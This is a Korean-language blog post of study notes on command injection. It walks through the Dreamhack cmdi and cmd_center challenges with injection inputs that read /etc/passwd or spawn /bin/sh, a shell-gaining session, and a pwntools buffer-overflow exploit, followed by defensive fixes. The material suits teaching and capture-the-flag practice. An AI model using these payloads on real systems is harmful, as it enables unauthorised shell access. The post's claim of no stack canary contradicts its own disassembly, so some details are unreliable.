---
layout: post
title: "Command Injection — 커맨드 인젝션"
date: 2026-11-13
categories: [pwn]
tags: [linux, c, dreamhack, command-injection, bof, pwntools]
excerpt: "system() 함수 동작 원리, 메타 문자, BOF를 이용한 cmd_center 워게임 풀이, 방어 기법까지 정리."
series: "취약점 분석"
series_index: 2
---

사용자 입력을 검증 없이 `system()` 같은 함수에 그대로 넘기면, 공격자가 임의 명령어를 실행할 수 있다. 이를 **Command Injection(커맨드 인젝션)** 이라 부른다.

## 1. system() 함수 & Shell Program

**system()**: 전달된 인자를 셸에 전달해 실행하는 C 표준 함수 (`stdlib.h`)

```c
int system(const char *command);
// 내부적으로 /bin/sh -c "명령어" 를 호출
```

> 💡 **do_system 내부 동작**: `system("cmd")` → 내부에서 `do_system` 호출 → `"sh -c"` + 인자 결합 → `execve("/bin/sh", ["-c", "cmd"], env)` 시스템 콜 실행. 즉, 셸을 직접 띄워서 거기에 명령어를 던지는 구조

| 예시 | 설명 |
|------|------|
| `system("cat /etc/passwd")` | 패스워드 파일 출력 |
| `system("/bin/sh")` | 셸 실행 → **해킹의 핵심 목표** |

**Shell Program**: 사용자와 OS 커널 사이의 명령어 해석기
- `/bin/sh` (기본, POSIX), `/bin/bash` (기능 많음), `/bin/dash` (경량)
- `system()`은 항상 `/bin/sh`를 사용

---

## 2. Command Injection 개념

**사용자 입력을 검사 없이 system()에 전달** → 임의 명령어 실행 가능

```c
system("ping [user-input]");  // user-input에 메타 문자 삽입 가능!
```

- **정의**: 사용자 입력값을 적절히 검증하지 않고 시스템 명령어의 인자로 전달할 때, 공격자가 의도하지 않은 명령을 함께 실행(Injection)하는 취약점
- **발생 원인**: 프로그램이 사용자 입력을 그대로 `system()` 등에 결합하여 사용할 때 발생

### 메타 문자 (Meta Characters)

| 메타 문자 | 동작 |
|-----------|------|
| `;` | 앞 명령 성공/실패 무관하게 뒤 명령 실행 |
| `&&` | 앞 명령 **성공**해야 뒤 명령 실행 |
| `\|\|` | 앞 명령 **실패**해야 뒤 명령 실행 |
| `\|` | 앞 명령의 출력을 뒤 명령의 입력으로 전달 |
| ` `` ` | 안의 명령어를 먼저 실행 후 결과 삽입 |
| `$()` | 백틱과 동일, 더 현대적인 방식 |
| `>` | 출력을 파일로 저장 |
| `*` | 모든 파일명에 매칭 |

### ping / cat 공격 예시

| 입력 | 실행 명령 | 결과 |
|------|-----------|------|
| `8.8.8.8` | `ping 8.8.8.8` | 정상 |
| `8.8.8.8; cat /etc/passwd` | `ping ...; cat /etc/passwd` | 패스워드 노출! |
| `8.8.8.8 && /bin/sh` | `ping ... && /bin/sh` | ping 성공 후 셸 획득! |

---

## 3. Dreamhack 예제 — cmdi.c

사용자 IP를 ping 인자로 전달, 입력값 검사 없음

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const int kMaxIpLen = 36;
const int kMaxCmdLen = 256;

int main() {
    char ip[kMaxIpLen];
    char cmd[kMaxCmdLen];

    memset(ip, '\0', kMaxIpLen);
    memset(cmd, '\0', kMaxCmdLen);
    strcpy(cmd, "ping -c 2 ");  // 초기값 세팅

    printf("Health Check\n");
    printf("IP: ");
    fgets(ip, kMaxIpLen, stdin);

    strncat(cmd, ip, kMaxCmdLen);  // 입력값 검사 없이 그대로 붙임!
    printf("Execute: %s\n", cmd);
    system(cmd);  // 위험!
    return 0;
}
```

**버퍼 처리 흐름:**

| 단계 | 코드 | cmd 상태 |
|------|------|----------|
| ① 초기화 | `memset(cmd, '\0', 256)` | 256칸 전부 0 |
| ② 앞부분 세팅 | `strcpy(cmd, "ping -c 2 ")` | `"ping -c 2 \0..."` |
| ③ 입력 받기 | `fgets(ip, 36, stdin)` | ip = `"127.0.0.1\n\0"` |
| ④ 뒤에 붙이기 | `strncat(cmd, ip, 256)` | `"ping -c 2 127.0.0.1\n\0"` |
| ⑤ 실행 | `system(cmd)` | ping 실행 |

### 실행 시나리오 비교

**① 정상 입력 (`127.0.0.1`)**

```bash
$ ./cmdi
건강 검진
IP: 127.0.0.1
실행: ping -c 2 127.0.0.1

PING 127.0.0.1 (127.0.0.1) 56(84)바이트의 데이터.
127.0.0.1에서 64바이트 수신: icmp_seq=1 ttl=64 time=0.019 ms
127.0.0.1에서 64바이트 수신: icmp_seq=2 ttl=64 time=0.032 ms
```

**② 공격 입력 (`127.0.0.1; /bin/sh`)**

```bash
$ ./cmdi
건강 검진
IP: 127.0.0.1; /bin/sh
실행: ping -c 2 127.0.0.1; /bin/sh

PING 127.0.0.1 (127.0.0.1) 56(84)바이트의 데이터.
127.0.0.1에서 64바이트 수신: icmp_seq=1 ttl=64 time=0.020 ms
127.0.0.1에서 64바이트 수신: icmp_seq=2 ttl=64 time=0.046 ms

$ id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
← 셸 획득 성공!
```

---

## 4. strcpy & 버퍼 오버플로우 (BOF)

**strcpy**: 문자열 복사 함수 — **길이 체크 없음** → 버퍼 초과 시 옆 메모리 덮어씀

```c
char buf[10];
strcpy(buf, "16자짜리 긴 문자열!");  // buf 초과 → BOF!
```

스택에서 BOF가 나면:

```
낮은 주소
┌──────────────────┐
│    buf[10]       │ ← 여기서 넘침
├──────────────────┤
│  다른 변수        │ ← 덮어써짐!
├──────────────────┤
│  SFP              │ ← 덮어써짐!
├──────────────────┤
│  RET (복귀 주소)  │ ← 덮으면 공격자 코드로 점프!
└──────────────────┘
높은 주소
```

**안전한 대안**: `strncpy(cmd, "ping -c 2 ", kMaxCmdLen)` — 길이 제한 있음

---

## 5. Exploit Tech: cmd_center

### 보호 기법 (checksec)

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found   ← 핵심!
NX:       NX enabled
PIE:      PIE enabled
```

| 보호 기법 | 의미 |
|-----------|------|
| Arch: amd64-64-little | 64비트, 리틀엔디언 (숫자를 메모리에 거꾸로 저장. `0x1234` → `34 12` 순서) |
| Full RELRO | GOT 읽기 전용 → GOT 덮어쓰기 불가 |
| **No canary** | BOF로 스택 자유롭게 덮기 가능 ← **이 문제의 핵심 취약점** |
| NX enabled | 스택/힙에서 셸코드 실행 불가 |
| PIE enabled | 실행마다 주소 랜덤화 → 주소 leak 필요 |

- **GOT (Global Offset Table)**: 외부 함수(`printf`, `system` 등)의 실제 주소를 담아두는 표
- **RELRO Full**: GOT를 읽기 전용으로 잠금 → GOT 주소 덮어쓰기 공격 불가
- **No Canary**: 스택에 랜덤 값 없음 → BOF 감지 못함 → 스택 자유롭게 덮기 가능
- **NX**: 스택/힙에 올린 코드를 실행 불가로 설정 → 셸코드 직접 올려서 실행 차단
- **PIE**: 실행마다 코드 주소가 랜덤으로 바뀜 → 주소 하드코딩한 공격 차단

### 소스 코드

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);   // 입력 버퍼링 끄기 (네트워크 환경용)
    setvbuf(stdout, 0, 2, 0);  // 출력 버퍼링 끄기
}

int main() {
    char cmd_ip[256] = "ifconfig";  // 기본 실행 명령어
    int dummy;
    char center_name[24];           // 24바이트

    init();

    printf("Center name: ");
    read(0, center_name, 100);  // 24바이트 버퍼에 100바이트 → BOF 발생!

    if (!strncmp(cmd_ip, "ifconfig", 8)) {  // 앞 8바이트만 비교
        system(cmd_ip);
    } else {
        printf("Something is wrong!\n");
    }
    exit(0);
}
```

### 코드 분석 & 스택 구조

스택 거리: `0x130 - 0x110 = 0x20 = 32바이트`

```
낮은 주소
┌─────────────────┐ rbp-0x130
│ center_name[24] │ ← 100바이트 입력 → 32 넘으면 아래 덮음!
├─────────────────┤ rbp-0x110
│   cmd_ip[256]   │ ← BOF로 68바이트 덮기 가능 (100 - 0x20 = 68)
└─────────────────┘
높은 주소
```

### strncmp vs strcmp

| 함수 | 비교 방식 | 결과 |
|------|-----------|------|
| `strcmp` | NULL까지 전체 비교 | `"ifconfig\x00;/bin/sh"` → NULL로 끊겨 실패 |
| `strncmp(..., 8)` | **앞 8바이트만** | `"ifconfig;/bin/sh"` → 앞 8바이트 일치 → **통과!** |

### 익스플로잇 페이로드

```python
from pwn import *

p = remote("host3.dreamhack.games", 10387)

payload  = b"A" * 0x20     # center_name ~ cmd_ip 사이 32바이트 채우기
payload += b"ifconfig"     # strncmp 통과 (앞 8바이트)
payload += b";/bin/sh"     # 메타문자로 셸 실행!

p.sendafter(b"Center name: ", payload)
p.interactive()

# [A*32]       → center_name ~ cmd_ip 사이 32바이트 채우기 (거리 = 0x20)
# [ifconfig]   → cmd_ip 첫 8바이트. strncmp가 앞 8바이트만 보니까 통과
# [;/bin/sh]   → 뒤에 붙어서 system("ifconfig;/bin/sh") 완성 → 셸 획득!
```

---

## 6. 스택 개념 & 보호 기법 정리

```
높은 주소
┌──────────────┐  ← rbp (기준점, 고정)
│  RET          │  ← 함수 종료 후 돌아갈 주소 → 덮으면 흐름 조작
│  SFP          │  ← 이전 함수의 rbp 백업
│  CANARY       │  ← 랜덤 값, BOF 감지용
│  지역변수     │  ← char buf[], int x 같은 것들
└──────────────┘  ← rsp (꼭대기)
낮은 주소
```

| 용어 | 설명 |
|------|------|
| rsp | 스택 꼭대기 화살표 (함수 호출마다 움직임) |
| rbp | 현재 함수의 기준점 (고정) → `rbp-0x110` 처럼 변수 위치 표현 |
| SFP | 이전 함수의 rbp 백업 |
| RET | 함수 종료 후 돌아갈 주소 → **여기 덮으면 흐름 조작** |
| Canary | 랜덤 값 심어두고 변조 감지 → No canary = BOF 자유 |

- **RET BOF**: BOF로 RET 덮어 실행 흐름을 공격자 주소로 바꿈
- **Canary 우회**: 프로그램 버그로 canary 값 leak → payload에 그대로 보존 후 RET 덮기

---

## 7. 어셈블리 분석

### 레지스터 & 기본 개념

레지스터 = CPU 안의 초고속 메모리 조각. 변수처럼 값을 임시 저장

| 레지스터 | 역할 |
|----------|------|
| `rsp` | Stack Pointer — 스택 꼭대기 주소 (계속 움직임) |
| `rbp` | Base Pointer — 현재 함수의 기준점 (함수 내내 고정) |
| `rax` | 계산/함수 반환값 저장 (범용) |
| `rdi` | 함수 1번째 인자 |
| `rsi` | 함수 2번째 인자 |
| `rdx` | 함수 3번째 인자 |

**`mov rbp, rsp`가 "기준점 설정"인 이유:**

```
함수 시작 시점의 rsp 위치를 rbp에 복사
→ rbp는 고정, rsp는 아래로 계속 이동
→ 변수 위치를 rbp-0x110 처럼 고정 기준으로 표현 가능!

QWORD PTR [rbp-0x110] = "rbp에서 0x110 뺀 주소에 있는 8바이트 메모리"
(C의 포인터 역참조 *ptr 과 동일한 개념)
```

### 전체 어셈블리 코드

```nasm
; 스택 프레임 설정
push   rbp
mov    rbp, rsp
sub    rsp, 0x130
; 카나리 설치
mov    rax, QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8], rax
xor    eax, eax
; "ifconfig" 하드코딩
movabs rax, 0x6769666e6f636669     ; 리틀엔디언 → "ifconfig"
mov    edx, 0x0
mov    QWORD PTR [rbp-0x110], rax
mov    QWORD PTR [rbp-0x108], rdx
; 버퍼 240바이트 0으로 초기화
lea    rdx, [rbp-0x100]
mov    eax, 0x0
mov    ecx, 0x1e               ; 30회 반복
mov    rdi, rdx
rep stos QWORD PTR es:[rdi], rax
; init() + printf
call   0x86a <init>
lea    rdi, [rip+0xf8]
mov    eax, 0x0
call   0x710 <printf@plt>
; read (취약점!)
lea    rax, [rbp-0x130]        ; center_name 주소
mov    edx, 0x64               ; 100바이트
mov    rsi, rax
mov    edi, 0x0
call   0x720 <read@plt>        ; 24바이트 버퍼에 100바이트 → BOF!
; strncmp 비교
lea    rax, [rbp-0x110]        ; cmd_ip 주소
mov    edx, 0x8
lea    rsi, [rip+0xd0]         ; "ifconfig"
mov    rdi, rax
call   0x6e0 <strncmp@plt>    ; 앞 8바이트만 비교
test   eax, eax
jne    0x95f <main+178>        ; 불일치 시 실패
; system() 실행
lea    rax, [rbp-0x110]        ; cmd_ip 주소
mov    rdi, rax
call   0x700 <system@plt>      ; system(cmd_ip) 실행!
jmp    0x96b <main+190>
; 실패 처리
lea    rdi, [rip+0xb5]
call   0x6f0 <puts@plt>
mov    edi, 0x0
call   0x740 <exit@plt>
```

### 섹션별 분석

**스택 프레임 설정:**
```nasm
push rbp          ; 이전 rbp 백업
mov  rbp, rsp     ; 내 함수의 기준점 설정
sub  rsp, 0x130   ; 304바이트 작업 공간 확보
```

**카나리 설치:**
```nasm
mov rax, QWORD PTR fs:0x28   ; OS 랜덤 canary 값
mov QWORD PTR [rbp-0x8], rax ; 스택에 심기
```

**"ifconfig" 하드코딩:**
```nasm
movabs rax, 0x6769666e6f636669  ; 리틀엔디언 → "ifconfig"
mov QWORD PTR [rbp-0x110], rax
```

**핵심 취약점 (read → BOF):**
```nasm
lea rax, [rbp-0x130]  ; 입력 버퍼 주소 (center_name)
mov edx, 0x64         ; 100바이트
call read@plt         ; 32바이트 거리 버퍼에 100바이트 → BOF!
```

**비교 & 실행:**
```nasm
strncmp(rbp-0x110, "ifconfig", 8)  ; 앞 8바이트만 비교
→ 통과 시: system(rbp-0x110)       ; 덮어쓴 명령 실행!
```

### 명령어 요약

| 명령어 | 의미 |
|--------|------|
| `mov A, B` | B 값을 A에 복사 |
| `push A` | A를 스택에 저장 (rsp 움직임) |
| `sub A, N` | A = A - N |
| `lea A, [addr]` | addr 주소값 자체를 A에 넣기 (포인터 계산용) |
| `call func` | 함수 호출 |
| `xor A, A` | A = 0 (자기 자신과 XOR = 항상 0, 빠른 초기화) |
| `test A, A` | A가 0인지 확인 (플래그만 세팅, 결과는 버림) |
| `jne label` | 이전 비교가 "불일치"면 label로 점프 |
| `rep stos` | 메모리를 특정 값으로 반복해서 씀 (ecx 횟수) |
| `movabs` | 64비트 큰 값을 레지스터에 넣기 (mov의 큰 버전) |
| `QWORD PTR [addr]` | addr 주소에 있는 8바이트 메모리 (역참조) |

---

## 8. 방어법

| 취약 코드 | 안전한 코드 | 이유 |
|-----------|-------------|------|
| `strncmp(cmd_ip, "ifconfig", 8)` | `strncmp(cmd_ip, "ifconfig", 9)` | 9바이트 비교 → NULL 바이트까지 확인 → `;/bin/sh` 삽입 차단 |
| `strncmp(cmd_ip, "ifconfig", 8)` | `strcmp(cmd_ip, "ifconfig")` | NULL까지 전체 비교 → "ifconfig\x00..." 외 불가 |
| `system(cmd_ip)` | 사용 자제 | system()은 메모리 익스플로잇에도 활용 가능 → 꼭 필요한 경우 외 사용 금지 |

> **핵심**: 입력값에 메타 문자 유무를 반드시 검사하고, `system()` 계열 함수 사용을 최소화

---

## 9. 키워드 정리

| 용어 | 정의 |
|------|------|
| **인젝션 (Injection)** | 악의적인 데이터를 프로그램에 입력해 시스템 명령어·코드·쿼리 등으로 실행시키는 기법 |
| **커맨드 인젝션 (Command Injection)** | 인젝션의 종류. 사용자 입력이 시스템 명령어로 실행되는 취약점. 원리는 단순하지만 매우 치명적 |
| **메타 문자 (Meta Character)** | 셸에서 특수하게 처리하는 문자. `;`로 여러 명령 연속 실행 가능 |
| **strncmp(a, b, n)** | 앞 n바이트만 비교 → n을 작게 설정하면 뒤에 임의 명령 삽입 가능 → 취약점 |
| **execve** | 실제 프로세스를 실행하는 리눅스 시스템 콜. system()이 내부적으로 호출 |
| **BOF (Buffer Overflow)** | 버퍼 크기를 초과한 입력으로 인접 메모리를 덮어쓰는 취약점 |
| **Canary** | 스택에 심어두는 랜덤 값. BOF 감지용 |
| **GOT (Global Offset Table)** | 외부 함수의 실제 주소를 담아두는 표 |
| **PIE** | 실행마다 코드 주소를 랜덤화하는 보호 기법 |
| **NX** | 스택/힙의 코드 실행을 방지하는 보호 기법 |
